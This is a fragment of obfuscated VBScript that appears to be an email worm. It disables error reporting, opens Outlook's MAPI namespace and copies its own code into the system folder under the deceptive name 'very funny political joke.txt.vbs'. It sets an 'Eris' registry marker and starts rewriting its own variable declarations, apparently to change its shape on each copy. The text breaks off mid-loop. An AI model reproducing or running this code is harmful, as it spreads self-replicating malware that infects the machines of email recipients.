rem MVOVDEKIDAJYFWBVYSDXELVFQLKOIBVXEZZYHAMOTIXJ

dim XZAVLEXSKLHYPXIR, BCZATWEFAYQ, ZHYPFOUDN, EXVKQPJOFRZBAXNSY, XTOFNJGFSIYSF, HTADWFOV, MDNZRVCFCUDAPOVWSJGL, JFJNFPIGOXQQRDFNCTGYW, KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY, IPKIXHRRAL, XBGVHBMUDCYPGGFBXSDCSJBTXLIRYBPMYQPLIJNYCWKXOMVGQZIQ, OIWZVQEBGOPGZRNMIWAQCCTWYYPFCZDARLFLHP, HVABLIB, CHDXNZHJSQCLLI, JJUTZPRFNQCKWWJQYLPBFRUHGOFWFK, AUWAHCOGHVEKB(16,2)
On Error Resume Next
IPKIXHRRAL="Outlook."
IPKIXHRRAL=IPKIXHRRAL&"Application"
Set XBGVHBMUDCYPGGFBXSDCSJBTXLIRYBPMYQPLIJNYCWKXOMVGQZIQ = CreateObject("Scripting.FileSystemObject")
Set HTADWFOV = XBGVHBMUDCYPGGFBXSDCSJBTXLIRYBPMYQPLIJNYCWKXOMVGQZIQ.GetSpecialFolder(1)
set CHDXNZHJSQCLLI=WScript.CreateObject(IPKIXHRRAL)
set JJUTZPRFNQCKWWJQYLPBFRUHGOFWFK=CHDXNZHJSQCLLI.GetNameSpace("MAPI")
set OIWZVQEBGOPGZRNMIWAQCCTWYYPFCZDARLFLHP=XBGVHBMUDCYPGGFBXSDCSJBTXLIRYBPMYQPLIJNYCWKXOMVGQZIQ.OpenTextFile(WScript.ScriptFullname,1)
set HVABLIB=XBGVHBMUDCYPGGFBXSDCSJBTXLIRYBPMYQPLIJNYCWKXOMVGQZIQ.CreateTextFile(HTADWFOV&"/very funny political joke.txt.vbs")
set IPKIXHRRAL=CreateObject("WScript.Shell")

if isnull(IPKIXHRRAL.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\Eris")) then
IPKIXHRRAL.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&"Eris",1,"REG_DWORD"
Randomize
for i = 1 to 3
HVABLIB.writeline OIWZVQEBGOPGZRNMIWAQCCTWYYPFCZDARLFLHP.readline
next
Do While Not OIWZVQEBGOPGZRNMIWAQCCTWYYPFCZDARLFLHP.AtEndOfStream
rem HJYEQMUGWOHKRJFQMPKDIPNVYPEAON
with HVABLIB
IPKIXHRRAL=OIWZVQEBGOPGZRNMIWAQCCTWYYPFCZDARLFLHP.readline
if left(IPKIXHRRAL,3)="dim" then
JFJNFPIGOXQQRDFNCTGYW="dim "
KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY=4
rem WQKBIHDDOYORJDW
for MDNZRVCFCUDAPOVWSJGL=1 to 16
KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY=KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY+1
AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,1)=""
rem AKYMNNQNIGQOJZJOAWYLXHBSHKDUNQCUQGSQUQEWUAOCOYGITRQRARLSTIIBLCGWGIDGMRGWBKWKAEMBCKOADRAZQLOTGKIOEZKPXXCTLQVUZXGZJHZSPMZVHBCDEWQBQKTZFPZUD
do while not (mid(IPKIXHRRAL,KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY,2)=", " or mid(IPKIXHRRAL,KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY,1)="")
